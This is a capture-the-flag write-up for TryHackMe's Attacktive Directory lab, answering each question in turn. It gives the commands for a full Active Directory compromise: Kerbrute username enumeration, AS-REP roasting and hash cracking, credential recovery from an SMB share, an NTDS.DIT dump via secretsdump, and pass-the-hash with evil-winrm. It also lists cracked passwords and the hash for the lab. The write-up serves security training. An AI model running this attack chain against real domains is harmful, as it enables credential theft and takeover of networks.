# TryHackMe AttacktiveDirect
## Enumeration
`sudo nmap -sC -sV 10.10.83.84`

Add host to local hosts files

`sudo echo 10.10.83.84 spookysec.local > /etc/hosts´
1. What tool will allow us to enumerate port 139/445?

	enum/linux
2. What is the NetBIOS-Domain Name of the machine?

	`enum4linux -A spookysec.local`

	THM-AD
3.  What invalid TLD do people commonly use for their Active Directory Domain? 

	.local
4. What command within Kerbrute will allow us to enumerate valid usernames?

	enum
5. What notable account is discovered? (These should jump out at you)

	Download pre-compiled kerberus 1.2 from git
	
	`chmod u+x kerberus_linux_386`
	
	`./kerbrute_linux_386 userenum -d spookysec.local  --dc spookysec.local /usr/share/wordlists/THM-ActiveDirect/userlist.txt`
	
	svc-admin
6. What is the other notable account is discovered? (These should jump out at you)
	backup

## Exploitation
1. We have two user accounts that we could potentially query a ticket from. Which user account can you query a ticket from with no password?
	svc-admin
2. Looking at the Hashcat Examples Wiki page, what type of Kerberos hash did we retrieve from the KDC? (Specify the full name)

	```
	cd /opt/impacket/examples
	python3 GetNPUsers.py spookysec.local/svc-admin --no-pass
	```
	Copy password and make a hash.txt file
	
	```
	cd /home/kali
	nano hash.txt
	```
	Crack the hash
	
	`john hash.txt`
	
	John will give us the type of hash 
	
	Kerberos 5 AS-REP etype 17/18/23
3. What mode is the hash?

	Go to example_hashes page on hashcat look for kerberos
	
	18200
4. Now crack the hash with the modified password list provided, what is the user accounts password?

	`wget https://raw.githubusercontent.com/Sq00ky/attacktive-directory-tools/master/passwordlist.txt`
	
	`john hash.txt --wordlist=/usr/share/wordlists/THM-ActiveDirect/passwordlist.txt` 
	
	management2005
## Enumeration 
1. What utility can we use to map remote SMB shares?
	smbclient
2. Which option will list shares?

	`man smbclient`
	
	-L
3. How many remote shares is the server listing?

	`smbclient -L 10.10.39.52 -U svc-admin`
	
	6
	
4. There is one particular share that we have access to that contains a text file. Which share is it?

	backup
	
5. What is the content of the file?

	`sudo smbclient -L //10.10.39.52/backup -U svc-admin`
	
	`get backup_credentials.txt`
	
	`cat backup_credentials.txt`
	
	YmFja3VwQHNwb29reXNlYy5sb2NhbDpiYWNrdXAyNTE3ODYw
	
6. Decoding the contents of the file, what is the full contents?

	base64decode.org and paste the hash
	
	backup@spookysec.local:backup2517860
	
## Domain privilege escalation
1. What method allowed us to dump NTDS.DIT?
	
	`sudo python3 secretsdump.py spookysec.local/backup:backup2517860@spookysec.local -just-dc`
	
	DRSUAPI
2. What is the Administrators NTLM hash?

	0e0363213e37b94221497260b0bcb4fc
3. What method of attack could allow us to authenticate as the user without the password?
	
	Pass the hash
4. Using a tool called Evil-WinRM what option will allow us to use a hash?

	-H

## Flag Submission
`evil-winrm -i 10.10.39.52 -u Administrator -H 0e0363213e37b94221497260b0bcb4fc`

	